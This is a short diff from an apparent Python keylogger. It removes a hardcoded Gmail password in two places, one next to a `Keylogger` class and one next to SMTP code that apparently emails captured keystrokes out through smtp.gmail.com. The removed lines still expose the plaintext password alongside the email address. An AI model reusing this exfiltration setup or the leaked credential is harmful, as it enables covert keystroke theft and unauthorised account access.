@@ -4,7 +4,7 @@ from threading import Semaphore, Timer
 
 SEND_REPORT_EVERY = 20
 EMAIL_ADDRESS = 'zaramaluna99@gmail.com'
-EMAIL_PASSWORD = 'NewGooglePassword45'
+EMAIL_PASSWORD = ''
 
 
 class Keylogger:
@@ -60,7 +60,7 @@ if __name__ == "__main__":
 import smtplib
 
 EMAIL_ADDRESS = 'zaramaluna99@gmail.com'
-EMAIL_PASSWORD = 'NewGooglePassword45'
+EMAIL_PASSWORD = ''
 
 server = smtplib.SMTP('smtp.gmail.com', 587)
 server.starttls()
